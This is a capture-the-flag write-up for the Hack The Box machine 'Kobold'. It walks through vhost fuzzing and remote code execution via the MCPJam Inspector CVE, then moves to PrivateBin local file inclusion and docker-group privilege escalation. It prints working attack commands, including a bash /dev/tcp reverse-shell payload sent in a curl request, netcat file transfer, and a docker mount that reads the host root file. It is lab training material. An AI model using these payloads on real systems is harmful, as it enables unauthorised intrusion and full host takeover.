---
title: Kobold
date: 2026-04-07
category: [HackTheBox, Linux, Web Exploitation]
tags: [nmap, ffuf]
difficulty: Easy
summary: Kobold is an easy rated box on Hack The Box
---

[Link to machine.](https://app.hackthebox.com/machines/Kobold)
## Reconnaissance
Starting out with a nmap SYN scan:
```bash
sudo nmap -sVCS -vv -p- --min-rate 5000 -oN nmap-scan <IP>
```
![Pasted image 20260404090541](/images/Pasted%20image%2020260404090541.png)
Found three services running aside from SSH. Port 80 running a nginx http server while port 443 runs a ssl/http nginx, just the same as one running on port 80 but with SSL. Port 3552 running a Golang server.
The two service running on port 80 and 443 resolves to a domain name of `kobold.htb`. Add IP and name pair to `/etc/hosts` and we are free to go. So try fuzzing for vhosts on both `http`:
```bash
ffuf -w ../../SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.kobold.htb" -u http://10.129.17.229:80 -c 200,301,302 > http-vhost
```
and `https`:
```bash
ffuf -w ../../SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.kobold.htb" -u https://10.129.17.229:443 -mc 200,301,302 > https-vhost
```
Fuzzing on `https` reveals two vhosts:
![Pasted image 20260404214531](/images/Pasted%20image%2020260404214531.png)
Add them to `etc/hosts` too, and we start exploring.
Visit the first web server, `kobold.htb` shows a simple webpage:
![Pasted image 20260404090814](/images/Pasted%20image%2020260404090814.png)
Inspect the page source, no other href can be reached from this page. Tried directory fuzzing with ffuf
```bash
ffuf -u https://kobold.htb/FUZZ -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
doesn't show any useful. The only thing I noticed here is that the contact email: `admin@kobold.htb`, maybe we have things to do with it later.
Moving on to the next `https://mcp.kobold.htb`:
![Pasted image 20260404222309](/images/Pasted%20image%2020260404222309.png)
It's running an MCPJam instance, which is said to be the Postman for MCP servers.
![Pasted image 20260404222453](/images/Pasted%20image%2020260404222453.png)
Tried Sign in and Create Account but bumped into invalid URI. However, the Settings tab shows that the version of the current instance of MCPJam is 1.4.2, which leads to a CVE Id of CVE-2026-23744. 
## [CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)
- Packet: MCPJam/Inspector (npm).
- Affected version: 1.4.2 and earlier.
- Severity: 9.8/10 (Critical).
- Type: RCE.
- Attack vector: `/api/mcp/connect` API.
### Details
The `/api/mcp/connect` API, which is intended to connect to remote MCP servers, now becomes an entry point for unauthorized requests.
More specifically, the targeted system extracts `command` and `args` field in the HTTP request sent to that API endpoint without performing any security checks, which can lead to Remote Code Execution.
## Back to the machine
So on the same page where I figured out the CVE, they show a PoC HTTP request that triggers the Windows machine to open a calculator app:
```bash
curl http://TARGET/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
```
Maybe I should give it a try and maybe we might end up with a reverse shell:
```bash
curl -k https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/10.10.15.26/44444 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
```
`-k`: to ignore certificate check.
Start a netcat listener on port 44444 and boom, we got the reverse shell!
![Pasted image 20260406173403](/images/Pasted%20image%2020260406173403.png)
Simple commands to search for user flag:
```bash
find / -type f -name user.txt 2>/dev/null
```
## Priviledge Escalation
I suppose I should find a way to escalate to a more persistent connection like ssh.
`sudo -l` showing nothing useful.
So got one hint is to continue checking out those remaining vhost and services. So now we continue with `https://bin.kobold.htb`:
![Pasted image 20260406181729](/images/Pasted%20image%2020260406181729.png)
It's running a PrivateBin instance with version 2.0.2. This version is vulnerable to CVE-2025-64714.
## [CVE-2025-64714](https://github.com/advisories/GHSA-g2j9-g8r5-rg82)
- Packet: privatebin/privatebin (composer)
- Affected version: 1.7.7 to prior to 2.0.3
- Severity: 5.8/10 (Medium) (https://nvd.nist.gov/vuln/detail/CVE-2025-64714)
- Attack vector: Network
### Details
"An unauthenticated Local File Inclusion exists in the template-switching feature: if `templateselection` is enabled in the configuration, the server trusts the `template` cookie and includes the referenced PHP file. An attacker can read sensitive data or, if they manage to drop a PHP file elsewhere, gain RCE."
The template switching allows user to change different bootstrap theme of the PrivateBin instance. But when the referenced file passed in `template` cookie isn't a BootstrapTemplate, the server tries to search for available file with that path and execute if possible, leading to RCE.
## Back to the machine
Tried the PoC payload:
```bash
curl -k -v --cookie "template=../cfg/conf" https://bin.kobold.htb/
```
![Pasted image 20260407144237](/images/Pasted%20image%2020260407144237.png)
The server responds with error code 500 just like in the Reproduction step. Which means this instance is indeed vulnerable to this CVE.
From the CVE of PrivateBin, if a malicious PHP payload is already on the server, we can enforce it to execute via local file inclusion, now that I've already had the foothold on the machine via the first CVE, I can send/craft a PHP payload and reference to it.
The reason why I'm doing this is that in the home directory, there is one other user aside from ben (alice). So I supposed this could be somehow running under that user.
Okay so now use netcat to initialize a listener on the targeted machine, the desired directory for the payload is `/var/tmp/`.
Netcat listener
```bash
nc -lvp 1234 > reverse.php
```
Netcat sender
```bash
nc -v 10.129.19.13 1234 < php-reverse-shell.php
```
![Pasted image 20260407093238](/images/Pasted%20image%2020260407093238.png)
Okay it seems like our reverse shell landed on the target machine successfully.
```bash
curl -v \
  -H "Host: bin.kobold.htb" \
  -H "Cookie: template=../../../../var/tmp/reverse" \
  -H "Cache-Control: max-age=0" \
  -H 'Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"' \
  -H "Sec-Ch-Ua-Mobile: ?0" \
  -H 'Sec-Ch-Ua-Platform: "macOS"' \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-User: ?1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Priority: u=0, i" \
  -H "Connection: keep-alive" \
  http://bin.kobold.htb/
```
So this curl will end up giving us the second reverse shell if success.
Tried many path from `../var/tmp/reverse` to a really long path with prefix `../` but I still cannot get the shell. So it could be that is approach is wrong somehow. It could be limited to some level we can perform path traversal?
This leads me to thinking If I could have access to any files that might be belong to the privatebin project on the machine. 
```bash
find / -perm -0002 -type f 2>/dev/null
```
This command to find all world writable files (others write bit set).
![Pasted image 20260407151731](/images/Pasted%20image%2020260407151731.png)
Those privatebin would really related to the running instance I suppose. Also it is good that there are also some .php sources. Now before performing any further ideas, I should test for the inclusion to see if I can really enforce the server to execute these.
Just by some accident but somehow I can cd into the privatebin-data folder.
![Pasted image 20260407152503](/images/Pasted%20image%2020260407152503.png)
The privatebin-data only have group permission, but I can still get in, which means the current user `ben` could be in the same `operator` group as the owner of privatebin.
![Pasted image 20260407171820](/images/Pasted%20image%2020260407171820.png)
Cd into the `privatebin-data`:
![Pasted image 20260407152925](/images/Pasted%20image%2020260407152925.png)
So it seems like we are not in the group `82`, so I'm unable to cd in. But the fact that the `cfg` directory is here and the previous path `../cfg/conf` succeed in LFI, then I can enforce the server to execute those php file that I have permission to write in by changing the template cookie to `../data/salt`.
```bash
curl -v -k --cookie "template=../data/salt" https://bin.kobold.htb/
```
![Pasted image 20260407153324](/images/Pasted%20image%2020260407153324.png)
The fact that the response with the template cookie successfully set means that my thoughts was right.  
Nevermind the whole data directory is world writable, we just need to put our php reverse shell there and done. So we just repeat our previous exploit but now put our reverse shell payload inside `/privatebin-data/data`.
Okay now open the nc listener and curl:
```bash
curl -v -k --cookie "template=../data/reverse" https://bin.kobold.htb/
```
![Pasted image 20260407155048](/images/Pasted%20image%2020260407155048.png)
FINALLY.
We now become `nobody`, but now we belong to group 82.
I was able to find those php files they are now in `/srv/data`
![Pasted image 20260407155459](/images/Pasted%20image%2020260407155459.png)
![Pasted image 20260407155627](/images/Pasted%20image%2020260407155627.png)
This `.dockerenv` saying that I'm currently inside a docker environment.
Okay I've got a hint where I can run docker commands via 
```bash
sg docker -c <commands>
```
![Pasted image 20260407172501](/images/Pasted%20image%2020260407172501.png)
Which really work.
That `privatebin/nginx-fpm-alpine` looks like the one instance running on `bin.kobold.htb`. If I have access to run docker images, then I can abuse its initial file system mount set up to mount root file system into that image:
```bash
sg docker -c 'docker run -u root -v /:/rootfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /rootfs/root/root.txt'
```
![Pasted image 20260407174126](/images/Pasted%20image%2020260407174126.png)
## Conclusion
- This machine really heavy on enumeration skill, also the privilege escalation part is really tricky.
- New privilege escalation technique using misconfigured permission in `cg` and initial mounting process of Docker.